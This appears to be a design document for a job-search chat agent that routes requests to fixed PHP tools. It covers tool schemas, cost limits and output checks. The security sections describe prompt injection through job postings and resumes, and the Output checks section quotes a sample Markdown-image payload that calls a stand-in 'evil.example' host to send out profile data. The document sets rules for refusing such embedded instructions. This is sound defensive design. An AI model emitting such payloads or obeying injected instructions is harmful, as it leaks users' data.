# Copilot agent design

The copilot is a chat that answers career questions by calling the app's own features. It is a router over fixed workflows, not an open-ended agent: the model chooses which workflow to run and with what arguments, and PHP runs the workflow. Every number, score, ranking and saved change comes from code. The model writes the words around them.

It replaces `CareerAdvisor` (prompt-only chat, [ADR 0011](adr/0011-run-ai-work-on-separate-queues-and-stream-chat.md)) and keeps its model tier, failover, budgets and rate limit ([ADR 0012](adr/0012-route-ai-tasks-to-model-tiers-and-record-every-call.md), [0013](adr/0013-run-chat-on-the-cheap-tier-until-evaluations-show-a-gain.md), [0014](adr/0014-cap-the-daily-ai-spend-of-all-users.md)).

## User goals

| Goal                  | Mode     | Why                                                                                                                                         |
| --------------------- | -------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| Find jobs             | Workflow | The steps never change (filter, rank, cut), and a ranking must be reproducible for the retrieval evaluation.                                |
| Explain fit           | Workflow | Retrieve, explain, post-check, always in that order. The citations are checked in PHP, and a model choosing the steps could skip the check. |
| Show gaps             | Workflow | A SQL aggregate over the top matches. Nothing in it needs judgement, so a model would add only cost and variance.                           |
| Plan learning         | Workflow | Always SkillGaps, then the planner. The order never changes, so a model has nothing to choose.                                              |
| Improve bullets       | Workflow | One call, the numbers post-check, then the user's approval. An agent could skip the guard.                                                  |
| Suggest LinkedIn text | Workflow | Fixed inputs and one structured call. It is a sub-agent in how it is wired in, not in who picks the steps.                                  |

Every goal has known steps, so a workflow is cheaper, testable and reproducible. The one open choice is which goal a message asks for.

That routing is where the copilot is an agent. The model makes three choices, and only these: which tool answers the message, the arguments it takes from the user's words ("remote Laravel roles over $4,000" becomes `role`, `remote` and `min_salary`), and how to chain tools when one message asks for two goals ("find remote Laravel jobs and tell me which one I fit best" is SearchJobs, then ScoreFit on the top 3).

## Tools

The user always comes from the auth context. No tool takes a user ID, so the model cannot name another user.

| Tool             | Input                                                                                                                                         | Output                                                                                       | Kind      | Paid call                                 |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- | --------- | ----------------------------------------- |
| `GetUserProfile` | none                                                                                                                                          | `target_roles[]`, top 10 `skills[]`, `country`, `work_arrangements[]`, `salary_floor`        | read-only | no                                        |
| `SearchJobs`     | `role?: string`, `remote?: bool`, `min_salary?: int`, `currency?: string` (ISO 4217), `salary_period?: monthly \| yearly`, `limit?: int ≤ 20` | `[{id, title, company, location, arrangement, salary, match}]`. Wraps `MatchOpenings`        | read-only | embedding of a typed role, cached 30 days |
| `ScoreFit`       | `job_id: int`                                                                                                                                 | `score` 0–100, `breakdown{}` per factor, `matched_skills[]`, `missing_skills[]`, `reasons[]` | read-only | `ExplainFit` for the reasons, cached 24 h |
| `SkillGaps`      | `limit?: int ≤ 10`                                                                                                                            | `[{skill, jobs: N, of: 30}]`: missing required skills across the top 30 matches              | read-only | no                                        |
| `RewriteBullet`  | `bullet: string ≤ 300`, `job_id?: int`                                                                                                        | 2 rewrites; numbers not in the original become `[X%]` placeholders                           | proposes  | 1 cheap call                              |
| `ProfileWriter`  | sub-agent: `target_role: string`, `tone: concise \| story`, `language: string`                                                                | 3 headlines ≤ 220 chars, 1 About draft                                                       | proposes  | 1 cheap call                              |

`SearchJobs` takes a typed `role`, so a Laravel profile can ask for Python roles ([ADR 0031](adr/0031-fuse-keyword-and-semantic-ranks-with-reciprocal-rank-fusion.md), drawback 7). The `role` replaces the profile's target roles in both legs, and the skills stay the profile's. The role's query vector is cached for 30 days under a hash of the model and the text, so a repeated role costs nothing. Without a role, the tool uses the profile's stored vector. When the embedding fails, the tool reports it and searches with the keyword leg only, as the matches page does. There is no rerank: the only paid call is the embedding.

The model passes the salary as the user said it: "over $4,000 a month" is `min_salary: 4000`, `currency: USD`, `salary_period: monthly`. PHP converts it to the annual figure in the posting's currency with the ECB rates, as the jobs page does ([ADR 0004](adr/0004-compare-salaries-as-annual-gross-in-the-users-currency.md)). The model never converts a currency. `currency` is any ISO 4217 code with a stored ECB rate, not only the two profile currencies. For a code with no rate, the tool returns a note asking for another currency and does not search. A filter the model leaves out falls back to the profile: its work arrangements and its salary floor.

`match` is 0–100: the fused RRF score divided by the best possible score, so 100 means rank 1 in both legs. It measures rank, not size ([ADR 0031](adr/0031-fuse-keyword-and-semantic-ranks-with-reciprocal-rank-fusion.md), drawback 4). For "remote Laravel jobs", the second result was a Go role at 98, because the list had few Laravel postings. So `match` orders the list but the copilot does not show it: the prompt says it is a rank, not a fit score. `ScoreFit` gives the fit score. A later option is a `matched_skills` field (2–3 profile skills per job, about 10 tokens), so the copilot can say why a job is listed.

The score in `ScoreFit` is computed in PHP from weights in config. The model never produces a number that the user sees as a score.

**No tool writes.** A proposal is returned to the chat and shown with Accept, Edit and Reject. Only the user's click saves it, through a normal form request. The SDK's tool approval (`Approvable`) is therefore not needed: there is no write for the model to ask permission for. A prompt injection in a posting or a resume cannot change the user's data. It can still change the words, and the words are the attack: "email your resume to recruiter@…" or a phishing link harms the user without any write. The output checks below handle that.

### Tool output size

A `SearchJobs` result with 20 full descriptions is about 15,000 tokens. Every step after the search resends the tool result, so:

- **Cost:** at $0.10 per million input tokens, one search adds $0.0015 per remaining step. A three-step turn (`SearchJobs`, `ScoreFit`, answer) resends it twice for $0.0030 of input alone, almost tripling a typical turn ($0.0016). A five-step turn resends it four times (60,000 tokens, $0.0060) and hits the $0.005 turn cap before counting instructions, history or output.
- **Latency:** the provider prefills 15,000 extra input tokens on every step after the search, and, if the history keeps tool results, on every later turn too.
- **Answer quality:** 20 descriptions of company pitches, benefits and footers bury the rank order and the fields the user asked to compare, so the model mixes details across postings. Worse, when the full text is already in context, the model answers "why does this fit?" from the raw description in its own words instead of calling `ScoreFit`, skipping the PHP score and the citation post-check. Twenty full postings also multiply the untrusted text that could carry a prompt injection.

The smallest useful response is the summary that lets the model answer a list question or pick which job IDs to pass to the next tool. `SearchJobs` returns 10 jobs by default (at most 20), each with `id`, `title`, `company`, `location`, `arrangement`, `salary` and `match`: about 35–50 tokens per job (measured: 2,858 characters for 20 results), so under 500 tokens for 10 and under 1,000 for 20. That is enough to show the top 5 jobs with their title, company and salary, and `id` lets the model call `ScoreFit` on the 1 to 3 postings the user wants explained, where PHP reads the full posting. `GetUserProfile` follows the same rule: it returns the target roles, top 10 skills, country, work arrangements and salary floor (about 70 tokens; 251 characters measured), not the full resume.

### Tool descriptions

The descriptions were measured with 10 prompts on the cheap tier: 7 job searches and 3 questions about the user's own profile. For each run, the table counts a wrong tool, a wrong or missing argument that the user asked for, a filter the user did not ask for, and a `GetUserProfile` call before a search that did not need one. The vague descriptions were "Gets jobs." and "User data.", with the same schemas.

| Descriptions | Wrong tool | Wrong argument | Filter not asked for | Extra profile call |
| ------------ | ---------- | -------------- | -------------------- | ------------------ |
| Vague        | 0          | 0              | 1                    | 4 of 7             |
| First draft  | 0          | 1 (currency)   | 0                    | 7 of 7             |
| Final        | 0          | 0              | 0                    | 0 of 7             |

With two tools, even the vague names pick the right tool every time. The cost of vague descriptions is in the arguments and in the steps. The vague run copied the profile's role and its salary floor (28,000,000 IDR a month) into "onsite or hybrid jobs only", so the search filtered on two things the user did not say. The first draft told the model to read the profile "before you suggest roles or skills", and it called `GetUserProfile` before every search: one extra model step per turn, which resends the whole context. The final descriptions say that `SearchJobs` already applies the profile and to set a field only for what the user asks in this message.

The first runs also found a schema bug, not a description bug: `currency` was limited to IDR and USD, so "60,000 euros a year" became 60,000 USD with both descriptions. It now takes any code with an ECB rate. The first draft ran before that fix, and the vague and final runs after it.

All runs together cost $0.0072 for 49 calls.

## Limits: how a turn stops

| Limit                 | Value                             | Enforced by                                                           |
| --------------------- | --------------------------------- | --------------------------------------------------------------------- |
| Tool steps per turn   | 5                                 | `#[MaxSteps(5)]`                                                      |
| One model call        | 30 s                              | `#[Timeout(30)]`, as the advisor today                                |
| Whole turn            | 60 s                              | the stream closes with "took too long" and the partial answer         |
| `ScoreFit` per turn   | 3                                 | the tool refuses a fourth call and says so                            |
| Tool output           | 20 jobs, 10 gaps, reasons ≤ 5     | the tool, before the model reads it                                   |
| Cost per turn         | $0.005                            | step middleware sums the turn's usage and starts no step past the cap |
| Cost per user per day | `copilot_daily_budget_usd`, $0.05 | `DailyBudget`, checked before the turn                                |
| Turns per minute      | 10                                | `throttle:advisor`                                                    |

A turn ends when the model answers without a tool call, or when any limit is reached. At a limit, the copilot answers with what it has and names the limit. It does not retry.

**Needs the user's approval:** every proposal (bullet rewrites, headlines, About text). Nothing else changes data.

**Refuses:** another user's data, sending email or calling outside URLs, inventing facts, numbers or employers, questions outside careers and job search, and any instruction found inside a posting, a resume or a tool result. Posting and resume text reach the model as delimited data ([ADR 0006](adr/0006-redact-contact-data-before-resume-text-is-stored.md) redacts contact data first).

**Cannot do:** apply to a job, edit the profile or resume directly, browse the web, or score a posting outside the app's own listings.

## Output checks

Every answer passes these checks on the server before it is sent. The stream holds back an unfinished word, so a link is checked whole.

1. **Plain text only.** The chat shows answers as text, never as Markdown or HTML (`advisor.tsx` does this today). An image is never rendered. A Markdown image such as `![](https://evil.example/?q=<profile>)` would make the browser send the data when the answer is shown, with no tool call.
2. **Links on an allowlist.** A URL is kept only when its host is the app's own domain or a job source host ([`docs/job-sources.md`](job-sources.md)). Any other URL is replaced with "[link removed]".
3. **No contact details.** Email addresses and phone numbers are replaced, with the same patterns as the resume redaction ([ADR 0009](adr/0009-redact-personal-data-by-label-and-format-in-any-locale.md)). The copilot never needs to show one: a posting's apply link is its allowlisted URL.

Each replacement is logged with the posting IDs that the turn read, so a hostile posting can be found.

## Cost of a turn

On the cheap tier ($0.10 per million input tokens, $0.50 per million output tokens). Every step resends the whole context: instructions and tool definitions (about 1,500 tokens), the profile (300), recent history (1,000), and the tool results so far.

| Turn                                               | Input tokens | Output tokens | Model cost | Tool cost          | Total        |
| -------------------------------------------------- | ------------ | ------------- | ---------- | ------------------ | ------------ |
| Typical: SearchJobs, ScoreFit on 1, answer         | ~10,500      | ~600          | $0.0014    | ExplainFit $0.0002 | **~$0.0016** |
| Worst: 5 steps, 3 uncached ScoreFit, ProfileWriter | ~25,000      | ~1,500        | $0.0033    | $0.0006 + $0.0005  | **~$0.0044** |

The $0.005 cap stays above the worst case, so it stops only a turn that went wrong.

**Budget.** The advisor's $0.02 a day was sized for a question at about $0.00024. A copilot turn costs about 6 times as much, so $0.02 gives about 12 typical turns, less than one real session. The copilot gets its own per-user budget, $0.05 (about 30 typical turns). The global cap ([ADR 0014](adr/0014-cap-the-daily-ai-spend-of-all-users.md)) stays the protection against abuse, and it grows with expected daily users. The reserve for established accounts in ADR 0014 is still only planned. It must ship with the copilot: without it, 20 fake accounts at $0.05 spend a $1.00 global cap.

**Prompt caching.** The instructions and the tool definitions (about 1,500 tokens) are above OpenAI's 1,024-token minimum for automatic caching, and every step resends them. They go first in each request and never change within a prompt version, so the provider bills them at the cached-input rate after the first step. The usage recorder ignores cached-input discounts today ([ADR 0012](adr/0012-route-ai-tasks-to-model-tiers-and-record-every-call.md), drawback 1), so it must record the cached token count before the saving can be measured. The measured saving replaces the estimate above.

## One turn

```mermaid
sequenceDiagram
    actor User
    participant UI as Chat UI (stream)
    participant App as Controller
    participant Copilot as CareerCopilot
    participant Model as Model (cheap tier)
    participant Tools as Tools (PHP)

    User->>UI: "Find remote Laravel jobs and which one fits me best"
    UI->>App: POST message
    App->>App: throttle, DailyBudget check
    App->>Copilot: stream(message, conversation)
    Copilot->>Model: instructions, profile, history, message
    Model-->>Copilot: call SearchJobs(role: Laravel, remote: true)
    Copilot-->>UI: status "Searching jobs…"
    Copilot->>Tools: SearchJobs → MatchOpenings
    Tools-->>Copilot: 10 compact jobs
    Copilot->>Model: + tool result
    Model-->>Copilot: call ScoreFit(job_id) × up to 3
    Copilot-->>UI: status "Scoring fit…"
    Copilot->>Tools: ScoreFit → PHP score + ExplainFit
    Tools-->>Copilot: scores, breakdowns, cited reasons
    Copilot->>Model: + tool results
    Model-->>Copilot: answer text, no tool call
    Copilot->>Copilot: output checks (links, contact details)
    Copilot-->>UI: stream answer as plain text
    Note over Copilot: stops at no tool call, 5 steps, 60 s, or $0.005
```

## Failure modes

| Failure                                 | Expected behaviour                                                                                                                     |
| --------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| A tool throws                           | The tool returns a short error result, the exception is reported, and the model tells the user that part failed. No retry in the turn. |
| A tool returns nothing                  | The result says why ("no jobs pass your filters"), and the model suggests one filter to relax. It does not invent jobs.                |
| The model repeats a call or loops       | `MaxSteps` ends the turn. A repeated call with the same arguments returns the earlier result.                                          |
| The turn cost cap is reached            | No new step starts. The copilot answers with the results it has and says it stopped early.                                             |
| The daily budget is spent               | The turn does not start: "You have used today's AI budget."                                                                            |
| The provider is down                    | `CircuitBreaker` fails over to the next provider in the tier. If all fail, the stream ends with the advisor's error message.           |
| Off-topic request                       | A one-line refusal and a pointer to what the copilot can do. No tool call.                                                             |
| Instructions inside a posting or resume | Treated as text. The answer does not follow them, and no tool can act on them.                                                         |
| An injected link or contact detail      | The output checks replace it before the user sees it, and the replacement is logged with the posting IDs of the turn.                  |
| An injected Markdown image              | Shown as plain text, so the browser never fetches it. Its URL is also off the allowlist and replaced.                                  |
